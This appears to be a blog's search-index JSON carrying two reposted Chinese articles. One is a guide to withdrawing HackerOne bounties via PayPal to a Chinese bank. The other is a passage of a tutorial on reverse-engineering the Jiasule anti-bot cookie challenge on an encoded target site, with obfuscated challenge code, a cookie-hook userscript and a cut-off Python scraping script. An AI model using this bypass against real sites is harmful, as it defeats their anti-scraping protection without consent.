[{"categories":["情报"],"content":" 转载自： https://cloud.tencent.com/developer/inventory/28529/article/1971100 ","date":"2024-10-07","objectID":"/hackerone%E4%B8%AA%E4%BA%BA%E6%8F%90%E7%8E%B0%E8%AF%A6%E7%BB%86%E6%95%99%E7%A8%8B/:0:0","series":null,"tags":["提现","hackone"],"title":"Hackerone个人提现详细教程","uri":"/hackerone%E4%B8%AA%E4%BA%BA%E6%8F%90%E7%8E%B0%E8%AF%A6%E7%BB%86%E6%95%99%E7%A8%8B/#"},{"categories":["情报"],"content":" 1. 前言国内的人赚点美金不容易，提出来更加不容易，提现中还有许多坑，小智在这里做了一个总结。 Hackeron 的提现是可以自动提到 Paypal 的，所以我们需要提前绑定好 Paypal 收款账号。 ","date":"2024-10-07","objectID":"/hackerone%E4%B8%AA%E4%BA%BA%E6%8F%90%E7%8E%B0%E8%AF%A6%E7%BB%86%E6%95%99%E7%A8%8B/:1:0","series":null,"tags":["提现","hackone"],"title":"Hackerone个人提现详细教程","uri":"/hackerone%E4%B8%AA%E4%BA%BA%E6%8F%90%E7%8E%B0%E8%AF%A6%E7%BB%86%E6%95%99%E7%A8%8B/#1-前言"},{"categories":["情报"],"content":" 2. Paypal 注册注册好 Paypal 收款账号，把自己信息实名好，该认证的都认证一下，在这里注册个人用户账号。 https://www.paypal.com/c2/webapps/mpp/account-selection ","date":"2024-10-07","objectID":"/hackerone%E4%B8%AA%E4%BA%BA%E6%8F%90%E7%8E%B0%E8%AF%A6%E7%BB%86%E6%95%99%E7%A8%8B/:2:0","series":null,"tags":["提现","hackone"],"title":"Hackerone个人提现详细教程","uri":"/hackerone%E4%B8%AA%E4%BA%BA%E6%8F%90%E7%8E%B0%E8%AF%A6%E7%BB%86%E6%95%99%E7%A8%8B/#2-paypal-注册"},{"categories":["情报"],"content":" 3. HackerOne 平台绑定 Paypal在 HackerOne 后台绑定 Paypal 账号，输入自己注册过的 Paypal 邮箱即可。 https://hackerone.com/settings/payment_preferences ","date":"2024-10-07","objectID":"/hackerone%E4%B8%AA%E4%BA%BA%E6%8F%90%E7%8E%B0%E8%AF%A6%E7%BB%86%E6%95%99%E7%A8%8B/:3:0","series":null,"tags":["提现","hackone"],"title":"Hackerone个人提现详细教程","uri":"/hackerone%E4%B8%AA%E4%BA%BA%E6%8F%90%E7%8E%B0%E8%AF%A6%E7%BB%86%E6%95%99%E7%A8%8B/#3-hackerone-平台绑定-paypal"},{"categories":["情报"],"content":" 4. 填写税表如果你是第一次获取赏金，那你还填写一下税表（W-8BEN），可以在这里填写。 https://hackerone.com/settings/bounties 一定要如实填写，真实姓名用拼音 倒置，W-8BEN 填写审核通过后，后面提现就不用再填写了。 (W-8BEN)的税表填写教程：https://jixiaobai.club/w8ben-tutorial/ ","date":"2024-10-07","objectID":"/hackerone%E4%B8%AA%E4%BA%BA%E6%8F%90%E7%8E%B0%E8%AF%A6%E7%BB%86%E6%95%99%E7%A8%8B/:4:0","series":null,"tags":["提现","hackone"],"title":"Hackerone个人提现详细教程","uri":"/hackerone%E4%B8%AA%E4%BA%BA%E6%8F%90%E7%8E%B0%E8%AF%A6%E7%BB%86%E6%95%99%E7%A8%8B/#4-填写税表"},{"categories":["情报"],"content":" 5. Paypal 提现到招商银行钱到 Paypal 后，就要提现到国内银行卡了，在这里关联提现银行卡 （提现注意，这里一定是选择 关联银行账户，非关联卡） 银行名称输入：CHINA MERCHANTS BANK，这时会自动填补 SWIFT 代码，没有补全就填：CMBCCNBS 分行地址可不填，账号就是你的账号卡账号，绑定即可。 银行卡真实身份一定要与 Paypal 真实身份能对上，不能拿别人的银行卡提现，否责会被退回，还可能被风控封号。 绑定后就可以在 Paypal 直接点转账，转账到刚才提现的银行卡中 ","date":"2024-10-07","objectID":"/hackerone%E4%B8%AA%E4%BA%BA%E6%8F%90%E7%8E%B0%E8%AF%A6%E7%BB%86%E6%95%99%E7%A8%8B/:5:0","series":null,"tags":["提现","hackone"],"title":"Hackerone个人提现详细教程","uri":"/hackerone%E4%B8%AA%E4%BA%BA%E6%8F%90%E7%8E%B0%E8%AF%A6%E7%BB%86%E6%95%99%E7%A8%8B/#5-paypal-提现到招商银行"},{"categories":["情报"],"content":" 6. 招商银行转人民币提到招商银行后，3天左右会收到外汇的短信过来，让你进行申报（有些金额小的也不用申报），最好下载一个招商银行客户端专业版 PC 端，去招商官网下载就行。 由于我这笔已经申报过了，这里会显示查看 申报时，有两个地方需要注意，地址选：新加坡，交易编码选择 ：122030 未纳入海关统计的网络购物 填写没问题的话，申报后，很快就会被审核（1~3天），审核通过后会有短信通知结果。 申报成功后，这时就要把银行卡中的美金结汇成人民币。 如下图，在这里结汇，把美元结汇成人民币即可，结汇是实时到账的，结汇成功后，钱就到账了，其他银行也是类似。 这时钱就已经到账银行卡了。 ","date":"2024-10-07","objectID":"/hackerone%E4%B8%AA%E4%BA%BA%E6%8F%90%E7%8E%B0%E8%AF%A6%E7%BB%86%E6%95%99%E7%A8%8B/:6:0","series":null,"tags":["提现","hackone"],"title":"Hackerone个人提现详细教程","uri":"/hackerone%E4%B8%AA%E4%BA%BA%E6%8F%90%E7%8E%B0%E8%AF%A6%E7%BB%86%E6%95%99%E7%A8%8B/#6-招商银行转人民币"},{"categories":["逆向"],"content":" 转载自： https://juejin.cn/post/7386485874300977178 ","date":"2024-10-06","objectID":"/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%9F%90%E7%BD%91%E7%AB%99%E5%8A%A0%E9%80%9F%E4%B9%90%E5%8F%82%E6%95%B0%E6%B5%81%E7%A8%8B%E8%AF%A6%E8%A7%A3/:0:0","series":null,"tags":["加速乐"],"title":"逆向分析某网站加速乐参数流程详解","uri":"/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%9F%90%E7%BD%91%E7%AB%99%E5%8A%A0%E9%80%9F%E4%B9%90%E5%8F%82%E6%95%B0%E6%B5%81%E7%A8%8B%E8%AF%A6%E8%A7%A3/#"},{"categories":["逆向"],"content":" 前言加速乐作为一种常见的反爬虫技术，在网络上已有大量详尽深入的教程可供参考。然而，对于那些初次接触的人来说，直接面对它可能仍会感到困惑。 ","date":"2024-10-06","objectID":"/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%9F%90%E7%BD%91%E7%AB%99%E5%8A%A0%E9%80%9F%E4%B9%90%E5%8F%82%E6%95%B0%E6%B5%81%E7%A8%8B%E8%AF%A6%E8%A7%A3/:1:0","series":null,"tags":["加速乐"],"title":"逆向分析某网站加速乐参数流程详解","uri":"/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%9F%90%E7%BD%91%E7%AB%99%E5%8A%A0%E9%80%9F%E4%B9%90%E5%8F%82%E6%95%B0%E6%B5%81%E7%A8%8B%E8%AF%A6%E8%A7%A3/#前言"},{"categories":["逆向"],"content":" 声明 本文仅用于学习交流，学习探讨逆向知识，欢迎私信共享学习心得。如有侵权，联系博主删除。请勿商用，否则后果自负。 ","date":"2024-10-06","objectID":"/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%9F%90%E7%BD%91%E7%AB%99%E5%8A%A0%E9%80%9F%E4%B9%90%E5%8F%82%E6%95%B0%E6%B5%81%E7%A8%8B%E8%AF%A6%E8%A7%A3/:2:0","series":null,"tags":["加速乐"],"title":"逆向分析某网站加速乐参数流程详解","uri":"/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%9F%90%E7%BD%91%E7%AB%99%E5%8A%A0%E9%80%9F%E4%B9%90%E5%8F%82%E6%95%B0%E6%B5%81%E7%A8%8B%E8%AF%A6%E8%A7%A3/#声明"},{"categories":["逆向"],"content":" 什么是加速乐？ 加速乐采用了一系列的高级反爬虫技术，包括OB混淆、动态加密算法和多层Cookie获取，以确保整体校验的严密性。关键校验字段位于Cookie中的__jsl_clearance_s。其验证过程通常涉及三次关键的请求： 首次请求：当用户首次尝试访问目标网站时，服务器会返回一个特殊的521状态码，其响应数据通过AAEncode技术进行混淆处理，以初步筛选访问者。 二次请求：紧接着的第二次请求中，如果服务器继续检测到可疑行为，它会再次返回521状态码，但这次响应数据将采用更为复杂的OB混淆，进一步验证访问者的身份。 三次请求：只有在前两次请求成功通过验证后，第三次请求才能成功访问网站，此时服务器将返回正常的状态码200，并提供用户所需的内容。 通过这一连串精心设计的步骤，加速乐确保了只有合法的访问者能够顺利获取网站数据，从而有效抵御恶意爬虫的侵扰，我们要做的就是模拟这些操作，获取想要的数据。 ","date":"2024-10-06","objectID":"/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%9F%90%E7%BD%91%E7%AB%99%E5%8A%A0%E9%80%9F%E4%B9%90%E5%8F%82%E6%95%B0%E6%B5%81%E7%A8%8B%E8%AF%A6%E8%A7%A3/:3:0","series":null,"tags":["加速乐"],"title":"逆向分析某网站加速乐参数流程详解","uri":"/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%9F%90%E7%BD%91%E7%AB%99%E5%8A%A0%E9%80%9F%E4%B9%90%E5%8F%82%E6%95%B0%E6%B5%81%E7%A8%8B%E8%AF%A6%E8%A7%A3/#什么是加速乐"},{"categories":["逆向"],"content":" 今日网站目标URL: aHR0cHM6Ly93d3cuY252ZC5vcmcuY24vZmxhdy90eXBlbGlzdD90eXBlSWQ9Mjc= ","date":"2024-10-06","objectID":"/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%9F%90%E7%BD%91%E7%AB%99%E5%8A%A0%E9%80%9F%E4%B9%90%E5%8F%82%E6%95%B0%E6%B5%81%E7%A8%8B%E8%AF%A6%E8%A7%A3/:4:0","series":null,"tags":["加速乐"],"title":"逆向分析某网站加速乐参数流程详解","uri":"/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%9F%90%E7%BD%91%E7%AB%99%E5%8A%A0%E9%80%9F%E4%B9%90%E5%8F%82%E6%95%B0%E6%B5%81%E7%A8%8B%E8%AF%A6%E8%A7%A3/#今日网站"},{"categories":["逆向"],"content":" 流程分析-浏览器按照常规做法，我们首先进行网络抓包分析。 ","date":"2024-10-06","objectID":"/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%9F%90%E7%BD%91%E7%AB%99%E5%8A%A0%E9%80%9F%E4%B9%90%E5%8F%82%E6%95%B0%E6%B5%81%E7%A8%8B%E8%AF%A6%E8%A7%A3/:5:0","series":null,"tags":["加速乐"],"title":"逆向分析某网站加速乐参数流程详解","uri":"/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%9F%90%E7%BD%91%E7%AB%99%E5%8A%A0%E9%80%9F%E4%B9%90%E5%8F%82%E6%95%B0%E6%B5%81%E7%A8%8B%E8%AF%A6%E8%A7%A3/#流程分析-浏览器"},{"categories":["逆向"],"content":" 第一次请求 发送：未携带 Cookie 响应：状态码521，Cookie 中的__jsluid_s值和js代码 ","date":"2024-10-06","objectID":"/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%9F%90%E7%BD%91%E7%AB%99%E5%8A%A0%E9%80%9F%E4%B9%90%E5%8F%82%E6%95%B0%E6%B5%81%E7%A8%8B%E8%AF%A6%E8%A7%A3/:5:1","series":null,"tags":["加速乐"],"title":"逆向分析某网站加速乐参数流程详解","uri":"/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%9F%90%E7%BD%91%E7%AB%99%E5%8A%A0%E9%80%9F%E4%B9%90%E5%8F%82%E6%95%B0%E6%B5%81%E7%A8%8B%E8%AF%A6%E8%A7%A3/#第一次请求"},{"categories":["逆向"],"content":" 第二次请求 发送：Cookie 携带__jsluid_s和__jsl_clearance_s值 响应：状态码521，新的js代码 ","date":"2024-10-06","objectID":"/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%9F%90%E7%BD%91%E7%AB%99%E5%8A%A0%E9%80%9F%E4%B9%90%E5%8F%82%E6%95%B0%E6%B5%81%E7%A8%8B%E8%AF%A6%E8%A7%A3/:5:2","series":null,"tags":["加速乐"],"title":"逆向分析某网站加速乐参数流程详解","uri":"/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%9F%90%E7%BD%91%E7%AB%99%E5%8A%A0%E9%80%9F%E4%B9%90%E5%8F%82%E6%95%B0%E6%B5%81%E7%A8%8B%E8%AF%A6%E8%A7%A3/#第二次请求"},{"categories":["逆向"],"content":" 第三次请求 发送：Cookie 携带原始__jsluid_s值，新的__jsl_clearance_s值 响应：状态码200，正文内容 观察结果揭示了对同一页面共发起了三次HTTP请求：前两次请求均遭遇了521状态码的响应，而最后一次请求成功收到了200状态码。这种模式正是加速乐反爬虫机制的显著特征。 ","date":"2024-10-06","objectID":"/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%9F%90%E7%BD%91%E7%AB%99%E5%8A%A0%E9%80%9F%E4%B9%90%E5%8F%82%E6%95%B0%E6%B5%81%E7%A8%8B%E8%AF%A6%E8%A7%A3/:5:3","series":null,"tags":["加速乐"],"title":"逆向分析某网站加速乐参数流程详解","uri":"/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%9F%90%E7%BD%91%E7%AB%99%E5%8A%A0%E9%80%9F%E4%B9%90%E5%8F%82%E6%95%B0%E6%B5%81%E7%A8%8B%E8%AF%A6%E8%A7%A3/#第三次请求"},{"categories":["逆向"],"content":" 流程分析-抓包工具浏览器上我们没能看到具体的响应，我们借助抓包工具试试，这里使用的Fiddler。 ","date":"2024-10-06","objectID":"/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%9F%90%E7%BD%91%E7%AB%99%E5%8A%A0%E9%80%9F%E4%B9%90%E5%8F%82%E6%95%B0%E6%B5%81%E7%A8%8B%E8%AF%A6%E8%A7%A3/:6:0","series":null,"tags":["加速乐"],"title":"逆向分析某网站加速乐参数流程详解","uri":"/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%9F%90%E7%BD%91%E7%AB%99%E5%8A%A0%E9%80%9F%E4%B9%90%E5%8F%82%E6%95%B0%E6%B5%81%E7%A8%8B%E8%AF%A6%E8%A7%A3/#流程分析-抓包工具"},{"categories":["逆向"],"content":" 第一次请求 ","date":"2024-10-06","objectID":"/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%9F%90%E7%BD%91%E7%AB%99%E5%8A%A0%E9%80%9F%E4%B9%90%E5%8F%82%E6%95%B0%E6%B5%81%E7%A8%8B%E8%AF%A6%E8%A7%A3/:6:1","series":null,"tags":["加速乐"],"title":"逆向分析某网站加速乐参数流程详解","uri":"/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%9F%90%E7%BD%91%E7%AB%99%E5%8A%A0%E9%80%9F%E4%B9%90%E5%8F%82%E6%95%B0%E6%B5%81%E7%A8%8B%E8%AF%A6%E8%A7%A3/#第一次请求-1"},{"categories":["逆向"],"content":" 第二次请求 ","date":"2024-10-06","objectID":"/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%9F%90%E7%BD%91%E7%AB%99%E5%8A%A0%E9%80%9F%E4%B9%90%E5%8F%82%E6%95%B0%E6%B5%81%E7%A8%8B%E8%AF%A6%E8%A7%A3/:6:2","series":null,"tags":["加速乐"],"title":"逆向分析某网站加速乐参数流程详解","uri":"/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%9F%90%E7%BD%91%E7%AB%99%E5%8A%A0%E9%80%9F%E4%B9%90%E5%8F%82%E6%95%B0%E6%B5%81%E7%A8%8B%E8%AF%A6%E8%A7%A3/#第二次请求-1"},{"categories":["逆向"],"content":" 第三次请求 同样，看到了三次请求的过程，并且向我们展示了具体的响应。 ","date":"2024-10-06","objectID":"/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%9F%90%E7%BD%91%E7%AB%99%E5%8A%A0%E9%80%9F%E4%B9%90%E5%8F%82%E6%95%B0%E6%B5%81%E7%A8%8B%E8%AF%A6%E8%A7%A3/:6:3","series":null,"tags":["加速乐"],"title":"逆向分析某网站加速乐参数流程详解","uri":"/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%9F%90%E7%BD%91%E7%AB%99%E5%8A%A0%E9%80%9F%E4%B9%90%E5%8F%82%E6%95%B0%E6%B5%81%E7%A8%8B%E8%AF%A6%E8%A7%A3/#第三次请求-1"},{"categories":["逆向"],"content":" 逆向分析","date":"2024-10-06","objectID":"/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%9F%90%E7%BD%91%E7%AB%99%E5%8A%A0%E9%80%9F%E4%B9%90%E5%8F%82%E6%95%B0%E6%B5%81%E7%A8%8B%E8%AF%A6%E8%A7%A3/:7:0","series":null,"tags":["加速乐"],"title":"逆向分析某网站加速乐参数流程详解","uri":"/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%9F%90%E7%BD%91%E7%AB%99%E5%8A%A0%E9%80%9F%E4%B9%90%E5%8F%82%E6%95%B0%E6%B5%81%E7%A8%8B%E8%AF%A6%E8%A7%A3/#逆向分析"},{"categories":["逆向"],"content":" 获取第一个__jsl_clearance_s通过Fiddler或使用python模拟请求，得到下面这样一段JS代码： document.cookie=('_')+('_')+('j')+('s')+('l')+('_')+('c')+('l')+('e')+('a')+('r')+('a')+('n')+('c')+('e')+('_')+('s')+('=')+(+!+[]+'')+(3+4+'')+(-~false+'')+(2+7+'')+(4+'')+(1+6+'')+(2+'')+((2\u003c\u003c1)+'')+((2)*[2]+'')+(([2]+0\u003e\u003e2)+'')+('.')+(-~1+'')+((2^1)+'')+((1+[2])/[2]+'')+('|')+('-')+((+true)+'')+('|')+('L')+('w')+('j')+(1+2+'')+('u')+('T')+('F')+('n')+(-~{}+'')+('j')+('j')+(~~''+'')+('E')+('t')+(~~false+'')+('g')+('I')+(-~1+'')+('J')+('g')+('i')+('K')+('m')+((1+[2])/[2]+'')+('N')+('f')+((1\u003c\u003c2)+'')+('%')+((1+[2]\u003e\u003e2)+'')+('D')+(';')+(' ')+('M')+('a')+('x')+('-')+('a')+('g')+('e')+('=')+(-~[2]+'')+(-~[5]+'')+((+false)+'')+(~~{}+'')+(';')+(' ')+('P')+('a')+('t')+('h')+('=')+('/')+(';')+(' ')+('S')+('a')+('m')+('e')+('S')+('i')+('t')+('e')+('=')+('N')+('o')+('n')+('e')+(';')+(' ')+('S')+('e')+('c')+('u')+('r')+('e');location.href=location.pathname+location.search 复制到浏览器执行下来看看: 得到了__jsl_clearance_s=1719472445.236|-1|Lwj3uTFn1jj0Et0gI2JgiKm6Nf4%3D; Max-age=3600; Path=/; SameSite=None; Secure 而__jsl_clearance_s正是第二次请求需要带上的Cookie之一 真的老登。为了使代码难以阅读和分析，还进行了AAEncode加密混淆。 ","date":"2024-10-06","objectID":"/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%9F%90%E7%BD%91%E7%AB%99%E5%8A%A0%E9%80%9F%E4%B9%90%E5%8F%82%E6%95%B0%E6%B5%81%E7%A8%8B%E8%AF%A6%E8%A7%A3/:7:1","series":null,"tags":["加速乐"],"title":"逆向分析某网站加速乐参数流程详解","uri":"/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%9F%90%E7%BD%91%E7%AB%99%E5%8A%A0%E9%80%9F%E4%B9%90%E5%8F%82%E6%95%B0%E6%B5%81%E7%A8%8B%E8%AF%A6%E8%A7%A3/#获取第一个__jsl_clearance_s"},{"categories":["逆向"],"content":" 获取第二个__jsl_clearance_s使用第一个请求后得到的 Cookies 继续发起第二段请求得到新的 JS 代码： 代码被压缩了，不是很好看，使用在线 JS 美化（https://spidertools.cn/#/formatJS）后： 以下js代码需要用base64解码还原 dmFyIF8weDRmOWQgPSBbJ0huSnUnLCAndzRKb3c1QWsnLCAnQ0NyRHE4S1gnLCAnS01PVlpNT1gnLCAnTUNERGp6Zz0nLCAndzU1M3c1UERwdz09JywgJ0NzT1hiY09YJywgJ3dvWENoTU9Bd3EwPScsICdKc09QWGNPKycsICd3cGxGdzZKWScsICdiWDhwd3BVPScsICd3NmZEamt6Q213PT0nLCAnd29CMHdyckRrZz09JywgJ3c2SENtTU9pWkE9PScsICdHUmJDa2x3PScsICdkdzAzS3c9PScsICd3NDdEcWNPN1RnPT0nLCAnRDhPUmZ3ST0nLCAnR3NPQ1NzT3QnLCAnVGpVZVB3PT0nLCAnd3BYQ25IUkonLCAndzR4Unc3YkRyUT09JywgJ1NjS2R3cUREdVE9PScsICdNMWhEd3JRPScsICd3b0xDdXNPaHdvcz0nLCAnZUZaQnc3MD0nLCAndzdYRG9jS3NkQT09JywgJ0NEZkRqa009JywgJ3c2Y3pXY0s4JywgJ1gxZ3F3cmM9JywgJ3dyL0RvRHZEaWc9PScsICdmbEhEdUFnPScsICdIQmJEak1LTCcsICdRRkxDcGNPaScsICdJOE9CY2NPTScsICd3NkFtdzRuQ2xRPT0nLCAnUEVIQ29EZz0nLCAndzVSWXdvckRyZz09JywgJ3c0Wi93cUhEblE9PScsICdPaWZEZ0RjPScsICdIV3hsd3BrPScsICdhWDdEblFVPScsICd3NzNEdGNPbndvUT0nLCAnWW1IQ25jT0QnLCAnV1h3NXdwMD0nLCAnUDFiQ29zS2wnLCAnd3B6Q2o4T3J3clE9JywgJ3c0UUd3Nm5Ec1E9PScsICdhOEtzd3J2RGt3PT0nLCAnQUN6RG1IMD0nLCAnd29uRGw4T3R3ck09JywgJ0pXVmJ3cTA9JywgJ1ozWWR3cFE9JywgJ0NHakNnc0t4JywgJ3c1TWFQTU8zJywgJ3c1c2dMTU9UJywgJ0lsUEN0WDQ9JywgJ3c2ckRsOE9VVUE9PScsICd3NFREa3NPRFd3PT0nLCAnd3FMRHVDTERsQT09JywgJ3c2TERrc09PVmc9PScsICdWeGN3d3AwPScsICd3NXJDdjhLY0t3PT0nLCAnY2NLU0NzSzcnLCAnYW01WHc1Yz0nLCAndzc4Snc2bkRwUT09JywgJ0tVUENxc0tRJywgJ3c1M0NqY0tIQUE9PScsICd3N0hDbmNLNE5BPT0nLCAnd3JuQ3Q4T1p3b1E9JywgJ3dwTWZ3cFhDalE9PScsICd3NUFJQnNPVCcsICd3NWZEczFqQ2p3PT0nLCAndzVSRHc3TXonLCAnd3J3a3dxYkNxZz09JywgJ3c0VjZ3clhEaHc9PScsICdHQ3JEdkE9PScsICd3cWZEa01PV3c0VT0nLCAnR3gzRGtzS28nLCAndzZjNmJjS0UnLCAnRXdERHV3az0nLCAnZWh2Q2gyMD0nLCAndzZ0VXc1VENrdz09JywgJ3c0dEh3Ni9EaGc9PScsICdHTUtadzdIRHNnPT0nLCAndzVNQ0FNTzMnLCAndzdoU3c2bkRnQT09JywgJ3c3VERsY09Md3FJPScsICd3NjAyYThLNicsICd3N3A5dzd3dScsICd3cmt1dzZ3NCcsICd3NnRKdzVQQ213PT0nLCAnZmxqRHBCcz0nLCAndzZERHE4S1lTZz09JywgJ0xHSEN2OEtkJywgJ2VuYkN0WFE9JywgJzZLMmk1ckdtNmFpYTZLNmMnLCAndzRnQ0FzTzcnLCAnUHNPcllnST0nLCAnY0RJck5BPT0nLCAndzdQQ2doRVUnLCAnd3JzVHc1WENsUT09JywgJ3dwUUt3NFlxJywgJ0RRRERpUkk9JywgJ3c2N0R0TU9td3JVPScsICdEbWpDaU1LaycsICdYY0tCd3BuRG93PT0nLCAnd3FrMEhNTzAnLCAndzRZN3c2WERzdz09JywgJ3dyakR0Q0REaEE9PScsICd3b0REb1F2RGdnPT0nLCAnd28wNndyakN2QT09JywgJ3c1SmV3b0hEaVE9PScsICdOa0xDcGNLNicsICd3ckxDdUhwaScsICdZSG82d3BvPScsICd3N3ZDb3NLK3c3Yz0nLCAndzROTXc1c3cnLCAnd3BZMXdvWENpUT09JywgJ3dxc013b1RDb0E9PScsICd3NWRNd3B6RHRRPT0nLCAndzRKMXc0dkNxdz09JywgJ3c0SENvTU9WVkE9PScsICd3N3pDbzhLd3c1MD0nLCAnd3AvQ21VUmMnLCAndzdkS3c3SVcnLCAndzdJYndxST0nLCAnd3JEQ2pNT1l3cXM9JywgJ2FsM0NpY09sJywgJ3c1TENvc09jUWc9PScsICdKOE9JWk1PUicsICd3NEhEc3NLamZRPT0nLCAndzVaSndvckRpQT09JywgJ3c0d0JhY0tkJywgJ0pCekRuQkE9JywgJ3dvaGF3NnpEZ2c9PScsICd3NlZBdzdvVCcsICd3NXpDcE1LZHc2Yz0nLCAnYUJVV1BnPT0nLCAndzV6RHNNT2ZWUT09JywgJ3c3ZHR3b2ZEalE9PScsICd3cnZEcGhyRG9BPT0nLCAnd3FZbndxcEMnLCAnT3p6RG55dz0nLCAndzdMQ25zSzd3cjQ9JywgJ3c3MHB3NzdEaUE9PScsICd3cTk4dzV4UScsICdBaDNDbDF3PScsICd3clo0dzczRGdRPT0nLCAnSXNPalg4T3UnLCAnZW5GTXc3bz0nLCAndzUzRHBjS1BZZz09JywgJ3c3Sjl3cTNEbFE9PScsICdFOE9NZjhPQyc","date":"2024-10-06","objectID":"/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%9F%90%E7%BD%91%E7%AB%99%E5%8A%A0%E9%80%9F%E4%B9%90%E5%8F%82%E6%95%B0%E6%B5%81%E7%A8%8B%E8%AF%A6%E8%A7%A3/:7:2","series":null,"tags":["加速乐"],"title":"逆向分析某网站加速乐参数流程详解","uri":"/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%9F%90%E7%BD%91%E7%AB%99%E5%8A%A0%E9%80%9F%E4%B9%90%E5%8F%82%E6%95%B0%E6%B5%81%E7%A8%8B%E8%AF%A6%E8%A7%A3/#获取第二个__jsl_clearance_s"},{"categories":["逆向"],"content":" 其它调试方式其它调试方式还有很多，比较推荐的有： ","date":"2024-10-06","objectID":"/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%9F%90%E7%BD%91%E7%AB%99%E5%8A%A0%E9%80%9F%E4%B9%90%E5%8F%82%E6%95%B0%E6%B5%81%E7%A8%8B%E8%AF%A6%E8%A7%A3/:8:0","series":null,"tags":["加速乐"],"title":"逆向分析某网站加速乐参数流程详解","uri":"/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%9F%90%E7%BD%91%E7%AB%99%E5%8A%A0%E9%80%9F%E4%B9%90%E5%8F%82%E6%95%B0%E6%B5%81%E7%A8%8B%E8%AF%A6%E8%A7%A3/#其它调试方式"},{"categories":["逆向"],"content":" Hook Cookie值：使用油猴断一下set cookie位置 (function () { 'use strict'; var org = document.cookie.__lookupSetter__('cookie'); document.__defineSetter__('cookie', function (cookie) { if (cookie.indexOf('__jsl_clearance_s') != -1) { debugger; } org = cookie; }); document.__defineGetter__('cookie', function () { return org; }); })(); 清除 cookie 重新刷新页面，页面被成功断住： 然后就可以尝试调试了，这里不做过多介绍。 ","date":"2024-10-06","objectID":"/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%9F%90%E7%BD%91%E7%AB%99%E5%8A%A0%E9%80%9F%E4%B9%90%E5%8F%82%E6%95%B0%E6%B5%81%E7%A8%8B%E8%AF%A6%E8%A7%A3/:8:1","series":null,"tags":["加速乐"],"title":"逆向分析某网站加速乐参数流程详解","uri":"/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%9F%90%E7%BD%91%E7%AB%99%E5%8A%A0%E9%80%9F%E4%B9%90%E5%8F%82%E6%95%B0%E6%B5%81%E7%A8%8B%E8%AF%A6%E8%A7%A3/#hook-cookie值使用油猴断一下set-cookie位置"},{"categories":["逆向"],"content":" 文件替换：利用 Fiddler 的自动响应。将第二次请求获取的js代码保存下来，可以手动复制，也可以向下面这样： 对响应内容进行js美化（https://spidertools.cn/#/formatJS） 清除cookie刷新，也能进行调试了： ","date":"2024-10-06","objectID":"/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%9F%90%E7%BD%91%E7%AB%99%E5%8A%A0%E9%80%9F%E4%B9%90%E5%8F%82%E6%95%B0%E6%B5%81%E7%A8%8B%E8%AF%A6%E8%A7%A3/:8:2","series":null,"tags":["加速乐"],"title":"逆向分析某网站加速乐参数流程详解","uri":"/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%9F%90%E7%BD%91%E7%AB%99%E5%8A%A0%E9%80%9F%E4%B9%90%E5%8F%82%E6%95%B0%E6%B5%81%E7%A8%8B%E8%AF%A6%E8%A7%A3/#文件替换利用-fiddler-的自动响应"},{"categories":["逆向"],"content":" 文件替换：利用 Chrome 的文件替换同上，将js代码美化后保存在本地，可能需要一些微调，例如：首尾Script标签前后会多出空格以及脚本最后可能多出/等。补上debuuger;即可进行替换调试： 然后将文件内容替换为上面美化处理后的js代码，清除 cookies 并刷新页面即可调试。 ","date":"2024-10-06","objectID":"/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%9F%90%E7%BD%91%E7%AB%99%E5%8A%A0%E9%80%9F%E4%B9%90%E5%8F%82%E6%95%B0%E6%B5%81%E7%A8%8B%E8%AF%A6%E8%A7%A3/:8:3","series":null,"tags":["加速乐"],"title":"逆向分析某网站加速乐参数流程详解","uri":"/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%9F%90%E7%BD%91%E7%AB%99%E5%8A%A0%E9%80%9F%E4%B9%90%E5%8F%82%E6%95%B0%E6%B5%81%E7%A8%8B%E8%AF%A6%E8%A7%A3/#文件替换利用-chrome-的文件替换"},{"categories":["逆向"],"content":" 结果验证根据上面的分析，我们拿到了每次请求所需要的cookie，发起请求就是很简单的事了。 #! -*-conding=: UTF-8 -*- # @Author : 海哥python # @Software: PyCharm import hashlib import re import json import execjs import requests from loguru import logger from fake_useragent import UserAgent session = requests.session() ua = UserAgent() def get_first_cookie(url: str, headers) -\u003e dict: cookies = {} response = session.get(url, headers=headers) cookies.update(response.cookies) 